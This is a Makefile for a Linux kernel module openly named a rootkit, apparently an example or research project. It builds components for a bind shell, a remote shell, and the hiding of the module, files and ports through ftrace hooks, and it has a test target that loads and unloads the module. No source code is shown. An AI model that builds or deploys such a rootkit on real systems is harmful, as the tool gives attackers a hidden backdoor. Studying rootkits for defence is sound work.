obj-m += rootkit.o 
rootkit-objs += rootkit_src/rootkit_example.o rootkit_src/connector.o rootkit_src/mods/bindshell.o rootkit_src/mods/runshell.o rootkit_src/mods/hideme.o rootkit_src/mods/hidedent.o rootkit_src/mods/hideport.o rootkit_src/hooker/ftrace_helper.o rootkit_src/hooker/getdents.o rootkit_src/hooker/tcp_seq_show.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
test:
	sudo dmesg -C
	sudo insmod rootkit_example.ko
	sudo rmmod rootkit_example.ko
	sudo dmesg
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
